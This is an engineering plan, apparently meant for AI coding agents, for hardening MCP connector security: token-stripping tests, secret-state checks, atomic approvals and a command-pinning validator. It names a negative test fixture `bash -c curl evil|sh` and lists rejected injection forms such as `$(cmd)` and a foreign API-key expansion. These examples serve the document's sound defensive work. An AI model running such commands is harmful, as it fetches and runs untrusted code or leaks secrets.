# Connector Security — Remaining Workstreams Execution Plan

> **For agentic workers:** implement task-by-task on branch `feat/connector-security-hardening` (worktree `C:\Users\TK\.aoa\wt\mcp-connectors`, off `origin/main` @ #301). Each step ends green + committed. TDD: failing test → implement → pass → ablation-verify security guards → commit.

**Goal:** Finish the connector-security PR — lock down the shipped WS1 leak fix (polish tests), add F2 credential-unresolvable deliverability, make MCP connector approval atomic (F4), and wire the WS2 command-safety validator + its pinning migration.

**Architecture:** Four independent, small-blast-radius workstreams. Order chosen for risk: **WS1-polish → F2 → F4 → WS2-wiring** (cheapest/safest first; WS2 last because it needs a cross-cutting pinning migration + founder/cross-repo decisions). Each is committable on its own.

**Tech stack:** TypeScript monorepo (pnpm workspaces), vitest, Drizzle. Verify with `pnpm build` + per-package suites (NOT `--filter server` only — WS1 lives in adapter packages). Integration/e2e only truly run on Linux CI (push) or local `AOA_E2E_FORCE_WINDOWS=1`.

---

## ⚠️ RESOLVED at execution — the `${TOKEN}`-in-args conflict (Option A, founder-approved 2026-07-26)

The complete fixture inventory (agent `af3466eb`) surfaced a conflict the plan + its Codex review both missed: the committed validator's blanket `$` ban (`DISALLOWED_CHAR`) is **incompatible with the shipped `${TOKEN}`-in-stdio-args secret-injection feature** — `buildConnectorSpecs` substitutes a connector's own `${TOKEN}` placeholder to its real secret env var, and it is valid in stdio `args`. Wiring the validator as-committed would have made every stdio connector that passes its token as a CLI arg **uncreatable** (a feature regression), not a fixture typo.

**Decision (Option A):** the validator now **strips the exact `${TOKEN}` sentinel before the `$`-char check** — so the connector's OWN placeholder is allowed in args (`--token ${TOKEN}`, `--flag=${TOKEN}`), while every OTHER `$`-form stays rejected: a **foreign** `${AOA_API_KEY}` (which the CLI would expand from AoA's own env — an exfiltration vector the pre-WS2 no-validation path *allowed*), `$(cmd)`, backticks, redirection, chaining. This both **preserves the shipped feature** AND is **stricter than the status quo**. Consequence for the migration: most inventory items flagged `SEMANTIC-REWRITE` collapse to simple **version-pins**; the only true rewrites are an absolute-path command (now `not_a_launcher`) and assertion-order adjustments where a route-level `${TOKEN}`/D7/FU-20 gate legitimately pre-empts command-safety.

Also folded in while wiring: a **trim guard** (reject a command with surrounding whitespace — `" npx "` would preview-safe then fail at exec). Delivery re-check lives in `selectConnectorRowsForAgent` + `computeConnectorDeliverability` (NOT `buildConnectorSpecs`, which is the substitution layer), guarded on `command &&` so a commandless stdio row keeps its `missing_command` classification.

---

## File Structure (what each touched file is responsible for)

| File | Role in this plan |
|---|---|
| `packages/adapters/{claude,gemini,opencode}-local/.../execute-env-scrub-fu23.test.ts` | WS1-polish: add AOA_API_KEY absent-with-connectors / present-without assertions |
| `packages/adapters/claude-local/src/__tests__/execute-runtime-hooks.test.ts` | WS1-polish: add hook-token-absent-with-connectors assertion (bridge enabled) |
| `server/src/services/secrets.ts` | F2: new `activeSecretNames(companyId)` grouped non-decrypting query |
| `server/src/services/mcp-connectors.ts` | F2 + WS2: `credential_unresolvable` + `unsafe_command` reasons; `computeConnectorDeliverability` + `selectConnectorRowsForAgent` checks |
| `server/src/services/mcp-connectors-crud.ts` | F2: batch secret-state into the deliverability list |
| `server/src/services/approvals.ts` | F4: connector-scoped transaction wrapper in `approve()`/`reject()` |
| `server/src/services/mcp-connector-create.ts` | WS2: wire `assertStdioCommandSafe` at the create chokepoint |
| `ui/src/api/mcpConnectors.ts` + `.../MCPConnectorsSection.tsx` | F2 + WS2: reason unions + `DELIVERABILITY_REASON_COPY` (compile-forced) |

---

## WS1-POLISH — execute-level run-bearer regression tests (CHEAP; do first)

The env-capture harness already exists (fake CLI dumps its `process.env` to `AOA_TEST_CAPTURE_PATH`). The FU-23 tests already call real `execute()` with a connector but assert only *ambient* secrets — they never assert the run bearer. Add the missing assertions. **Vacuity guard: always pair "absent WITH connectors" against "present WITHOUT connectors".**

### Task 1.1: gemini + opencode + claude AOA_API_KEY assertions
**Files:** `packages/adapters/gemini-local/src/server/__tests__/execute-env-scrub-fu23.test.ts`, `packages/adapters/opencode-local/src/server/execute-env-scrub-fu23.test.ts`, `packages/adapters/claude-local/src/__tests__/execute-env-scrub-fu23.test.ts`.

- [ ] **Step 1:** In each file's existing **connectors-present** `it`, add after the ambient assertions:
```ts
// WS1 — the run-scoped API bearer must NOT reach a connector child.
// ABLATION: delete stripConnectorRunBearers(...) in execute.ts → this goes RED.
expect(env.AOA_API_KEY).toBeUndefined();
```
and in the existing **no-connector** `it` (byte-identity foil):
```ts
expect(env.AOA_API_KEY).toBe("secret-run-token"); // present without connectors
```
(`env` is the captured child env; `authToken: "secret-run-token"` is already the fixture — confirm the local variable name matches each file.)
- [ ] **Step 2:** Run each suite: `pnpm --filter @armyofagents/adapter-gemini-local exec vitest run src/server/__tests__/execute-env-scrub-fu23.test.ts` (and gemini/opencode/claude equivalents). Expected PASS.
- [ ] **Step 3 — ablation:** temporarily delete the `stripConnectorRunBearers(...)` call in one adapter's `execute.ts`, re-run → the absent assertion must FAIL. Restore by hand-edit (NOT `git checkout` — it wiped an uncommitted fix earlier this project).
- [ ] **Step 4:** Commit.

### Task 1.2: claude AOA_RUNTIME_HOOK_TOKEN assertion (in the hook-bridge harness)
**File:** `packages/adapters/claude-local/src/__tests__/execute-runtime-hooks.test.ts` (it already enables the bridge + captures env; asserts `capture.env.AOA_RUNTIME_HOOK_TOKEN === HOOK_TOKEN` on a no-connector run).

- [ ] **Step 1:** Add a new `it("connector run: both run bearers stripped even with the hook bridge on")` reusing `HOOK_BRIDGE_SPEC`, `HOOK_TOKEN`, `makeBaseContext`, adding `mcpBridge`/`mcpServers` (the `BRIDGE` + `{ notion: NOTION }` fixtures) so `connectorsPresent` is true:
```ts
expect(capture.env.AOA_RUNTIME_HOOK_TOKEN).toBeUndefined();
expect(capture.env.AOA_API_KEY).toBeUndefined();
```
The existing positive case (no connectors → token present) is the byte-identity foil.
- [ ] **Step 2:** Run → PASS. **Step 3 — ablation** as above. **Step 4:** Commit.

> Do NOT assert `PAPERCLIP_API_KEY` for these three adapters (only hermes sets it → vacuous). codex exec-path parity is optional (app-server path already proven).

---

## F2 — `credential_unresolvable` deliverability (contained)

A connector active with a secret that was later deleted/disabled shows "deliverable" while every run silently skips it. Truth: **resolvable ⟺ a `company_secrets` row exists with `deleted_at IS NULL` AND `status = "active"`** (`secrets.ts:360` throws `"Secret is not active"` otherwise; `getByName` filters `isNull(deletedAt)`). `secretRef` stores the secret NAME.

### Task 2.1: grouped, non-decrypting active-secret-names query
**File:** `server/src/services/secrets.ts` (add a method to the returned service object).
- [ ] **Step 1 — failing test** in `server/src/services/__tests__/secrets*.test.ts` (or a focused new file): `activeSecretNames(companyId)` returns a Set of names for rows with `status:"active"` + `deletedAt:null`, excludes disabled/deleted. Use the existing sequence-mock DB pattern.
- [ ] **Step 2:** Run → fail. **Step 3 — implement:**
```ts
activeSecretNames: async (companyId: string): Promise<Set<string>> => {
  const rows = await db
    .select({ name: companySecrets.name })
    .from(companySecrets)
    .where(and(
      eq(companySecrets.companyId, companyId),
      eq(companySecrets.status, "active"),
      isNull(companySecrets.deletedAt),
    ));
  return new Set(rows.map((r) => r.name));
},
```
Plain column select — no `resolveVersion`, no provider read, no decryption (Codex constraint). **Step 4:** pass. **Step 5:** commit.

### Task 2.2: the deliverability reason + pure-function check
**File:** `server/src/services/mcp-connectors.ts`.
- [ ] **Step 1 — failing test** in `server/src/services/__tests__/mcp-connectors.test.ts` `computeConnectorDeliverability` describe: an active connector with `secretRef` set + `secretResolvable: false` → `{ deliverable: false, reason: "credential_unresolvable", blockedAgents: [] }`; with `secretResolvable: true` → not that reason; with `secretResolvable` omitted → legacy behavior (no `credential_unresolvable`).
- [ ] **Step 2:** fail. **Step 3 — implement:** add `credential_unresolvable` to `ConnectorDeliverabilityReason` (the delivery-preview union — NOT `ConnectorSkipReason`). Add optional `secretResolvable?: boolean` to `ConnectorDeliverabilityInput`. Insert **after the D7 block, before `buildConnectorSpecs`**:
```ts
const hasSecret = Boolean(connector.secretRef);
if (hasSecret && input.secretResolvable === false) {
  return { deliverable: false, reason: "credential_unresolvable", blockedAgents: [] };
}
```
Ordering is faithful to delivery: D7 (selector) → secret resolve (loader) → spec-shape. **Step 4:** pass. **Step 5:** commit.

### Task 2.3: wire the batched state into the list caller + UI copy
**Files:** `server/src/services/mcp-connectors-crud.ts` (`list`), `ui/src/api/mcpConnectors.ts`, `ui/.../MCPConnectorsSection.tsx`.
- [ ] **Step 1 — failing test:** extend the crud `list` test (or a focused test) — a company with an active connector whose secret is deleted → the returned deliverability is `credential_unresolvable`. (Mock `activeSecretNames` to return an empty/partial set.)
- [ ] **Step 2:** fail. **Step 3 — implement:** in `list`, call `activeSecretNames(companyId)` once (beside `loadConfig().deploymentMode`), pass per row:
```ts
secretResolvable: r.secretRef ? activeNames.has(r.secretRef) : undefined,
```
Add `| "credential_unresolvable"` to `ui/src/api/mcpConnectors.ts` union, and the copy to `DELIVERABILITY_REASON_COPY` (compile-forced by the `Record<Reason,string>` type):
```ts
credential_unresolvable:
  "This connector's secret is missing or disabled, so it can't authenticate and reaches no agents.",
```
- [ ] **Step 4:** `pnpm --filter @armyofagents/server exec vitest run <touched tests>` + `pnpm --filter @armyofagents/ui build` (compile-forces the copy). Pass. **Step 5:** commit.

---

## F4 — atomic MCP connector approval (connector-scoped wrapper)

HTTP is already atomic (route wraps `approve()` in a tx via `approvalService(tx)`). The two MCP callers build the service with a **pool** `db`, so the status flip and `applyConnectorApproval` commit in **two autocommits** — a death between strands the install (approved + connector `pending_approval`, unrecoverable in `authenticated`). **Recommended (lowest blast radius): wrap ONLY the `install_mcp_connector` branch in its own `db.transaction`; leave hire_agent/crew_dispatch byte-for-byte unchanged.** Reuses the `withInsertTransaction` precedent from `mcp-connector-create.ts`.

### Task 4.1: harness — pass-through `transaction`
**File:** `server/src/__tests__/approvals-mcp-connector.test.ts` (`makeDb` ~105-169 does NOT stub `transaction`).
- [ ] **Step 1:** add `transaction: (fn: (tx: unknown) => unknown) => fn(dbObject)` to the mock db (mirrors `createConnector`'s injected pass-through), so `mcpConnectorService(tx)` resolves to the same mocks. Commit the harness change with Task 4.2.

### Task 4.2: connector-scoped transaction in `approve()` + `reject()`
**File:** `server/src/services/approvals.ts` (`approve()` ~217-450; the connector branch ~432; `reject()` ~494).
- [ ] **Step 1 — failing test:** in `approvals-mcp-connector.test.ts`, assert the status-flip UPDATE and `updateIfStatusAndSecret` both occur inside a single `transaction` callback; and a thrown `applyConnectorApproval` leaves the approval NOT flipped (rollback). It fails today (two separate writes, no tx).
- [ ] **Step 2:** fail. **Step 3 — implement:** early-return the connector case BEFORE the shared flip UPDATE:
```ts
if (existing.type === "install_mcp_connector") {
  const payload = existing.payload as Record<string, unknown>;
  const connectorId = typeof payload.connectorId === "string" ? payload.connectorId : null;
  const now = new Date();
  return db.transaction(async (tx) => {
    const updated = await tx.update(approvals)
      .set({ status: "approved", decidedByUserId, decisionNote: decisionNote ?? null, decidedAt: now, updatedAt: now })
      .where(and(eq(approvals.id, id), eq(approvals.companyId, companyId),
                 inArray(approvals.status, ["pending", "revision_requested"])))
      .returning().then((r) => r[0]);
    if (!updated) return null;
    if (connectorId && connectorDeploymentMode !== null) {
      await applyConnectorApproval(mcpConnectorService(tx), companyId, connectorId, connectorDeploymentMode);
    }
    return updated;
  });
}
```
Symmetric wrapper in `reject()` for `applyConnectorRejection` (recommended for cleanliness; flag as optional).
- **On HTTP:** `db` is already the route tx → `db.transaction` opens a savepoint (project nests service txs elsewhere: `replaceAgents`, the create route) → still atomic, behavior unchanged. **On MCP:** `db` is the pool → real tx → fixed. **hire_agent/crew_dispatch:** never enter this branch → zero regression.
- [ ] **Step 4:** run `approvals-mcp-connector.test.ts` + `approvals-connector-credentials.test.ts` + `mcp-connector-approval-adversarial.test.ts`. Pass.
- [ ] **Step 5 (Linux/`AOA_E2E_FORCE_WINDOWS` only):** add a real-tx rollback case to `mcp-connector-install.integration.test.ts` — inject an `applyConnectorApproval` failure via a non-tx service, assert the approval stays `pending`. ⚠ `*.integration.test.ts` is Windows-skipped — verify on push or via skipIf-flip.
- [ ] **Step 6:** Commit.

---

## WS2-WIRING — enforce command safety + pinning migration (do last)

The validator (`assertStdioCommandSafe` in `mcp-connector-command-safety.ts`) is built + tested but unwired, because current fixtures/catalog are unpinned. Wire it at the create chokepoint + delivery, and pin every in-scope fixture in the SAME change (else installs 400 / rows drop).

### Task 5.1: pin every in-scope test fixture FIRST (so wiring doesn't red them)
**Files (exact, from investigation — pin the command args to `name@1.0.0` form):**
- `tests/e2e/fixtures/connectors.json` — `@e2e/local-tool` → `@e2e/local-tool@1.0.0`
- `server/src/__tests__/mcp-connector-install-route.test.ts` — `fs-mcp` (:132), `acme-db-tool` (:142, :313, :372)
- `server/src/__tests__/mcp-connector-install-adversarial.test.ts` — `verifiedStdio` fs-mcp, `unverifiedStdio` acme-db-tool, `noTrustStdio` mystery-tool, install-body entries (:840,:855,:938,:1283,:1292,:1536,:1553); the delivery rows `stdioLocalRow` (:1244), `verifiedCatalogStdio`/`communityCatalogStdio`/`legacyNullTierStdio` (~1348) — add pinned `command`/`args`; RE-CHECK the negative `bash -c curl evil|sh` (:520) asserted reason (now also `not_a_launcher`)
- `server/src/__tests__/mcp-connector-create.test.ts:325` (`npx -y fs-mcp`, expects success) → pin
- `server/src/__tests__/mcp-connectors-routes.test.ts:103` (`goodStdio`) → pin
- `server/src/services/__tests__/mcp-connectors-loader.test.ts:246,264` (`dbhub`) → pin
- [ ] **Step 1:** pin all of the above. **Step 2:** run the affected suites — they should still pass (pinned commands are valid input; nothing enforces yet). **Step 3:** commit "pin connector test fixtures ahead of validator wiring".

### Task 5.2: wire at the create chokepoint
**File:** `server/src/services/mcp-connector-create.ts` (near the `RESERVED_MCP_SERVER_NAMES` guard, before `resolveConnectorStatus`).
- [ ] **Step 1 — failing test** in `mcp-connector-create.test.ts`: `createConnector` with `transport:"stdio"` + unpinned command → throws (400/`ConnectorCommandUnsafeError`); pinned → succeeds; http → unaffected.
- [ ] **Step 2:** fail. **Step 3 — implement:**
```ts
if (input.transport === "stdio") {
  try { assertStdioCommandSafe(input.command, input.args); }
  catch (e) { if (e instanceof ConnectorCommandUnsafeError) throw badRequest(e.message); throw e; }
}
```
Covers BOTH callers (BYO + catalog) + ALL modes (incl. BYO-in-local_trusted per decision 2). **Step 4:** pass + re-run install-route + adversarial suites (now-pinned fixtures survive; add "consent valid but command unpinned still rejected" ordering assertion). **Step 5:** commit.

### Task 5.3: delivery revalidation (skip-not-throw, mode-independent)
**File:** `server/src/services/mcp-connectors.ts` `selectConnectorRowsForAgent`.
- [ ] **Step 1 — failing test** in the `selectConnectorRowsForAgent` describe: an unpinned stdio row → dropped via `onSkip(c, "unsafe_command")`, pinned survives, non-stdio unaffected; ablation: remove the check → delivered.
- [ ] **Step 2:** fail. **Step 3 — implement:** add `"unsafe_command"` to `ConnectorSkipReason`; in the filter, **whenever `row.transport === "stdio"` (NOT gated on `deploymentMode` — divergence from the D7 pattern, per decision 2)**: `if (!isStdioCommandSafe(row.command, row.args)) { input.onSkip?.(c, "unsafe_command"); return false; }`. Extend the row-cast interface with `command?`/`args?`. Also add the same global check to `computeConnectorDeliverability` so Settings previews it without a run. Add `unsafe_command` to `ui/src/api/mcpConnectors.ts` + `DELIVERABILITY_REASON_COPY` (compile-forced).
  - **Fixture caveat:** the D7-only delivery fixtures with NO command now trip `missing_command` → skipped. Per investigation: pin the ones asserting *delivery* (done in 5.1); a stdio row with no command is genuinely undeliverable.
- [ ] **Step 4:** run server + `pnpm --filter @armyofagents/ui build`. Pass. **Step 5:** commit.

### Task 5.4: audit-per-delivery event (RESOLVED — founder wants it now; completes Decision #116 clause 7)
**File:** `server/src/services/mcp-connectors-loader.ts` (the real delivery path `loadEnabledConnectorRows`) + `server/src/services/activity-log.ts` (or the existing audit sink).
- [ ] **Step 1 — failing test:** when a connector is delivered to a run (passes the selector), an audit event `mcp_connector.delivered` is emitted with `{ connectorId, serverName, transport, command (stdio), trustTier, runId, agentId }`. (AoA cannot observe the actual child exec — the CLI spawns it — so the honest event is `delivered`, not `spawned`; name + doc it so.)
- [ ] **Step 2:** fail. **Step 3 — implement:** emit the event once per delivered connector in `loadEnabledConnectorRows`, best-effort (a logging failure must NOT break delivery — wrap in try/catch like the existing skip-log). **Step 4:** pass. **Step 5:** commit. This is what lets the PR honestly claim #116 clause 7 (audit) is satisfied.

### Task 5.5 (verify on push): e2e + integration
- [ ] Run connector e2e (`AOA_E2E_FORCE_WINDOWS=1`) — the pinned `tests/e2e/fixtures/connectors.json` must still install→active. Push for Linux CI (the pinning + integration are invisible to a plain Windows run).

---

## OPEN DECISIONS (surface before/at execution)

1. **F4 scope:** connector-scoped wrapper (recommended, zero hire/crew regression) vs full service-level boundary (atomic for all types on MCP but re-enters the high-regression zone). → **Recommend connector-scoped.**
2. **F4 reject():** wrap symmetrically (recommended, cosmetic) or leave (lower severity). → **Recommend wrap.**
3. **WS2 delivery check is mode-INDEPENDENT** (diverges from FU-19 D7's `deploymentMode !== undefined` gate) because decision 2 makes pinning universal. Confirm.
4. **WS2 BYO consent — RESOLVED (founder, 2026-07-26): implicit consent, NO new dialog.** local_trusted is the founder's own machine; the WS2 validator (exact pinning + closed grammar) in `createConnector` is the safety floor, and the founder authored the command. Do NOT build a BYO consent dialog/token. (Marketplace unverified-entry consent stays as-is — those commands come from third parties.)
5. **WS2 cross-repo:** real curated stdio entries in `aoa-marketplace-cdn/connectors.json` MUST be exact-pinned or `createConnector` 400s every install (external-repo deliverable). Optionally add a pin `.refine` to the shared `McpConnectorCatalogEntrySchema` so a mis-published unpinned entry drops from the shelf instead of failing at install (would need `packages/shared/src/__tests__/mcp-connector-catalog.test.ts` pins).
6. **WS2/registry integrity:** exact-version pinning ≠ provenance. Registry/config pinning (`npm_config_registry`, `.npmrc`, `UV_INDEX_URL`) + digest/vendoring + OS sandboxing are SEPARATE, later layers (Codex). This plan does NOT claim to sandbox connector code.

## Self-review
- Spec coverage: WS1-polish (Tasks 1.1–1.2), F2 (2.1–2.3), F4 (4.1–4.2), WS2 (5.1–5.4) — all Codex-round-3 + plan-review items mapped. ✅
- Placeholder scan: every code step carries concrete code + exact file:line. ✅
- Type consistency: reasons added to the SAME two unions (server `ConnectorDeliverabilityReason` + ui) everywhere; `secretResolvable?`/`activeSecretNames` names consistent across tasks. ✅

---

## Codex plan-review corrections (BLOCKING — fold in before executing)

**WS1-polish**
- **[P1] Task 1.2 fixes:** `execute-runtime-hooks.test.ts`'s `makeBaseContext()` supplies **no `authToken`** → the `AOA_API_KEY` assertion would be vacuous. Add `authToken: "secret-run-token"` to the connector-case ctx. And **`BRIDGE`/`NOTION` don't exist in that file** — use the fixtures that DO (or define a local `mcpBridge`/`mcpServers`); the plan's snippet won't compile as written. Keep the hook-token assertion only in the bridge-enabled test.

**F2**
- **[P1] Task 2.2 — rename the reason to be honest.** `active + not deleted` is NOT full resolvability: `resolveSecretValue` (secrets.ts:350) can still fail on a missing current version, invalid/unavailable provider config, or an empty resolved value. Rename `credential_unresolvable` → **`credential_inactive_or_missing`** across server + ui, and document that it catches the common (deleted/disabled) case, not every runtime resolution failure. No reverse false-positive risk (the loader always tries to resolve a non-null `secretRef`). Ordering (after D7, before spec build) is confirmed faithful.
- **[P2] Task 2.3** — update the existing sequence-query mocks in the crud `list` test to account for the added `activeSecretNames` select + its order.

**F4**
- **[P1] Task 4.1 — the pass-through mock CANNOT prove rollback.** `transaction(fn) => fn(db)` records the write; a later throw can't undo it. The **unit test proves only that both writes use the callback's `tx`**; **rollback proof is integration-only** (`mcp-connector-install.integration.test.ts`, Linux/`AOA_E2E_FORCE_WINDOWS`). Adjust the two test intents accordingly.
- **[P1] Task 4.2 — `reject()` transaction is MANDATORY, not optional.** A rejection that commits while `applyConnectorRejection` fails strands `pending_approval`, or lets a `needs_credentials` row be later credential-bound → active (status treated as proof of prior approval). Wrap `reject()` symmetrically.
- **[P1] Cast:** `mcpConnectorService(tx as unknown as Db)` — the tx type isn't the exported pool `Db`; existing tx callers use this cast.
- **[P2] Don't duplicate the flip UPDATE** — extract a shared **tx-bound transition helper** (company scope + `status IN (pending,revision_requested)` + `RETURNING` + claim-first) and call it from both the shared path and the connector branch, to prevent drift.
- **[P2]** Use `updated.payload` (authoritative claimed row), not `existing.payload`.
- **[P2]** Make the two MCP tools' post-commit `logActivity`/`syncApprovalHubItem` **independently best-effort** — a logging failure must not error after the decision committed nor block hub reconcile.

**WS2**
- **[P1] Task 5.1 fixture list is INCOMPLETE.** Also touch: `mcp-connectors.test.ts:352` (`stdioWithSecret` + secretless derivative); `mcp-connectors-routes.test.ts:191` ("real path" test — the new policy *intentionally rejects* it → **semantic rewrite**, not a pin); `mcp-connector-install-adversarial.test.ts:~901` (stdio `${TOKEN}` cases — unsafe-command validation now **pre-empts** the asserted credential error → re-order/adjust the assertion). **Add a task: after wiring, re-scan EVERY `selectConnectorRowsForAgent` / `computeConnectorDeliverability` / create-route stdio fixture** — the line inventory is a starting point, not complete.
- **[P2] Task 5.2 — reject a non-trimmed command.** The validator trims for the launcher check but the original string is persisted/spawned. Require `command === command.trim()` (or persist the normalized launcher) so `" npx "` can't preview-safe then fail at exec.
- **[P2] Task 5.3** — the loader's hard-coded `onSkip` log message says "D7/deployment mode"; make it accurate for `unsafe_command`. And **flag the breaking migration explicitly**: existing unpinned USER rows stop delivering immediately (correct fail-closed, but needs release-notes + UI handling, not just fixture pinning). Preview order: D7 → unsafe_command → credential → spec.
- **[P1] Task 5.4 — cross-repo catalog pinning is a RELEASE PREREQUISITE, not an open decision.** Every real stdio entry in `aoa-marketplace-cdn/connectors.json` must be exact-pinned before this ships or valid catalog installs 400 immediately.
- **[P1] NEW — Decision #116 audit-per-spawn — RESOLVED (founder wants it now): added as Task 5.4** (`mcp_connector.delivered` best-effort event in `loadEnabledConnectorRows`). With it, the PR completes #116 clause 7's audit requirement.

**Net:** approach is sound on all four; the corrections are (1) two WS1 test-compile/vacuity fixes, (2) an honest F2 reason rename, (3) F4: reject() mandatory + rollback-proof is integration-only + shared transition helper + tx cast, (4) WS2: complete the fixture migration + trim guard + honest audit scoping.
